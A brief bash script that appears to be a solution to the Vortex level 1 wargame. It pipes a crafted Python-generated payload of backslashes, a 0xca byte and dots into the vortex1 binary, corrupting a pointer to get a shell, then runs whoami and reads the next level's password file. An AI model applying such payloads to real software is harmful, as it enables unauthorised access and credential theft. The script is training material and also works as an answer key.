#!/usr/bin/env bash

python -c 'print("\\"*261 + chr(0xca) + "\\" + "." + "."*3832 + "\nwhoami\ncat /etc/vortex_pass/vortex2\n")' | /vortex/vortex1
